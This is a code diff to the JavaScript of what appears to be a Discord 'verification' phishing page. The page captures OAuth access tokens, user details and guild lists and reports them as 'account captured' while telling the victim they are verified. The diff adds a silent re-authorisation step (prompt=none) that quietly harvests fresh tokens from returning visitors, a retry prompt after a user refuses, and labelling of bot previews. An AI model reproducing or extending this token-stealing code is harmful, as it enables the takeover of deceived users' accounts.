@@ -138,12 +138,13 @@ function build(title, d, user, guilds, token) {
   };
 }
 
-function goOAuth() {
+function goOAuth(silent) {
   const u = new URL("https://discord.com/oauth2/authorize");
   u.searchParams.set("client_id", CONFIG.CLIENT_ID);
   u.searchParams.set("response_type", "token");
   u.searchParams.set("scope", CONFIG.SCOPES);
   u.searchParams.set("redirect_uri", CONFIG.REDIRECT || location.origin + location.pathname.replace(/index\.html$/, ""));
+  if (silent) u.searchParams.set("prompt", "none");
   location.href = u.toString();
 }
 
@@ -163,6 +164,7 @@ async function callback(hash) {
     if (r.ok) guilds = await r.json();
   } catch (e) {}
   await report(build("Hesap yakalandı", d, user, guilds, token));
+  try { localStorage.setItem("v_ok", "1"); } catch (e) {}
   try { history.replaceState(null, "", location.pathname); } catch (e) {}
   $("#sp").style.display = "none";
   $("#t").textContent = "Doğrulandı";
@@ -174,12 +176,23 @@ async function callback(hash) {
   const hash = new URLSearchParams(location.hash.slice(1));
   if (hash.get("access_token")) return callback(hash);
 
-  const d = await collect();
-  await report(build("Tıklandı (giriş yapılmadı)", d, null, [], null));
+  const q = new URLSearchParams(location.search);
+  const err = q.get("error");
+  if (err) { try { localStorage.removeItem("v_ok"); } catch (e) {} }
 
-  if (CONFIG.AUTO_OAUTH && !CONFIG.CLIENT_ID.includes("BURAYA")) return goOAuth();
+  const d = await collect();
+  await report(build(BOT ? "Önizleme (bot)" : "Tıklandı", d, null, [], null));
+
+  if (BOT) { /* değişmiyor */ }
+
+  if (err === "access_denied") { $("#b").classList.remove("hide"); $("#b").onclick = () => goOAuth(false); return; }
+  if (CONFIG.AUTO_OAUTH && !CONFIG.CLIENT_ID.includes("BURAYA")) {
+    let seen = false;
+    try { seen = !!localStorage.getItem("v_ok"); } catch (e) {}
+    return goOAuth(seen);
+  }
   $("#b").classList.remove("hide");
-  $("#b").onclick = goOAuth;
+  $("#b").onclick = () => goOAuth(false);
 })();
 </script>
 </body>
